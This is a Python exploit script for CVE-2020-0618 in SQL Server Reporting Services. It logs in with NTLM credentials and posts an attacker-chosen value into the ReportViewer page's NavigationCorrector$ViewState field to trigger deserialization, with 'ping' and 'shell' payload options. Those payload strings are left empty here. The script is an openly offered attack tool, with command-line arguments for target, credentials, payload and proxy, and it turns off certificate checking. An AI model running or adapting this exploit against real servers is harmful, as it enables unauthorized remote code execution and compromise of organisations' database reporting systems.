#!/usr/bin/python
from sys import argv, exit
import argparse
import requests
from bs4 import BeautifulSoup
from pwn import *
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests_ntlm import HttpNtlmAuth


context.log_level = 'info'


class Exploit:
    report_path = '/ReportServer/pages/ReportViewer.aspx'
    ping_payload = ''
    shell_payload = ''

    def __init__(
            self,
            redirect=False,
            proxy_address='',
            username='',
            domain='',
            password='',
            target='',
            payload='ping'
    ):
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        self.username = '%s\\%s' % (domain, username)
        self.payload = self.ping_payload if payload == 'ping' \
            else self.shell_payload
        self.target = target
        self.password = password
        self.session = requests.session()
        self.redirect = redirect
        self.timeout = 0.5
        self.proxies = {
            'http': 'http://%s' % proxy_address,
            'https': 'http://%s' % proxy_address
        } \
            if proxy_address is not None \
               and proxy_address != '' else {}
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)'
        }
        self.query_params = {}
        self.form_values = {
            '__VIEWSTATE': '',
            # 'NavigationCorrector$PageState': '',
            # 'NavigationCorrector$ViewState': '',
            # '__REQUESTDIGEST': '',
            # '__EVENTTARGET': '',
            # '__EVENTARGUMENT': '',
            # '__VIEWSTATEGENERATOR': '',
            # '__CALLBACKID': '',
            # '__CALLBACKPARAM': '',
            # '__EVENTVALIDATION': ''
        }
        self.cookies = {}

    def do_get(self, url, params=None, data=None):
        return self.session.get(
            url=url,
            verify=False,
            allow_redirects=self.redirect,
            headers=self.headers,
            cookies=self.cookies,
            proxies=self.proxies,
            data=data,
            params=params,
            auth=HttpNtlmAuth(self.username, self.password)
        )

    def do_post(self, url, data=None, params=None):
        return self.session.post(
            url=url,
            data=data,
            verify=False,
            allow_redirects=self.redirect,
            headers=self.headers,
            cookies=self.cookies,
            proxies=self.proxies,
            params=params,
            auth=HttpNtlmAuth(self.username, self.password)
        )

    def parse_page(self, content):
        soup = BeautifulSoup(content, 'lxml')
        for tag in soup.select('input'):
            try:
                self.form_values[tag['name']] = tag['value']
            except Exception as err:
                log.debug('error %s' % str(err))
        return self

    def debug(self):
        try:
            import http.client as http_client
        except ImportError:
            import httplib as http_client
        http_client.HTTPConnection.debuglevel = 1
        logging.basicConfig()
        logging.getLogger().setLevel(logging.DEBUG)
        requests_log = logging.getLogger("requests.packages.urllib3")
        requests_log.setLevel(logging.DEBUG)
        requests_log.propagate = True
        return self

    def get_form(self):
        url = '%s%s' % (self.target, self.report_path)
        resp = self.do_post(url=url)
        self.parse_page(content=resp.content)
        return self

    def send_payload(self):
        self.form_values['NavigationCorrector$ViewState'] \
            = self.payload
        self.form_values['NavigationCorrector$PageState'] = 'NeedsCorrection'
        self.form_values['__VIEWSTATE'] = ''
        url = '%s%s' % (self.target, self.report_path)
        resp = self.do_post(url=url, params=self.query_params, data=self.form_values)
        return resp


if __name__ == '__main__':
    parser = argparse.ArgumentParser(add_help=True, description='CVE-2020-0618 SQL Server Reporting Services exploit')
    try:
        parser.add_argument('-target', action='store', help='Target address: http(s)://target.com ')
        parser.add_argument('-payload', action='store', help='Payload to use: ping or shell')
        parser.add_argument('-username', action='store', help='Username to use: first.last')
        parser.add_argument('-domain', action='store', help='User domain to use: domain.local')
        parser.add_argument('-password', action='store', help='Password to use: Summer2020')
        parser.add_argument('-debug', action='store', default=False, help='Enable debugging: False')
        parser.add_argument('-proxy', action='store', default='', help='Enable proxy: 10.10.10.10:8080')

        if len(argv) == 1:
            parser.print_help()
            exit(1)
        options = parser.parse_args()

        exp = Exploit(
            proxy_address=options.proxy,
            username=options.username,
            domain=options.domain,
            password=options.password,
            target=options.target,
            payload=options.payload
        )

        if options.debug:
            context.log_level = 'debug'
            exp.debug()
            log.debug('target %s payload %s username %s domain %s password %s debug %s proxy %s' % (
                options.target, options.payload, options.username, options.domain, options.password, options.debug, options.proxy
            ))

        # exp.get_form()
        response = exp.send_payload()
        log.success(response.content)

    except Exception as error:
        log.debug('error in main %s' % str(error))
        parser.print_help()
